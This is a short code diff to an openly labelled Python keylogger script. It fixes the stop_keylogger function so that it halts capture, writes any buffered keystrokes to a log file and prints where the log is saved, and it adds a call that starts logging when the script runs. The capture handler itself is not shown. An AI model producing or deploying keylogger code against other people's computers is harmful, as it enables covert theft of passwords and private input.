@@ -58,7 +58,7 @@ def on_key_press(event):
 
 def start_keylogger():
     """This starts capturing keystrokes"""
-    global running, last_key_time
+    global last_key_time
 
     print("=" * 50)
     print("KEYLOGGER - Press ESC to stop")
@@ -76,4 +76,14 @@ def start_keylogger():
     finally:
         stop_keylogger()
 
-def stop_keylogger() # This function is for stopping the keylogger .. this us yet to be implemented
+
+def stop_keylogger():  # This function is for stopping the keylogger .. this us yet to be implemented
+    """Stop capturing keystrokes"""
+    global running
+    running = False
+    if keys:  # Write any remaining keys
+        write_to_file()
+    print(f"\nKeylogger stopped. Log saved to {log_file}")
+
+
+start_keylogger()
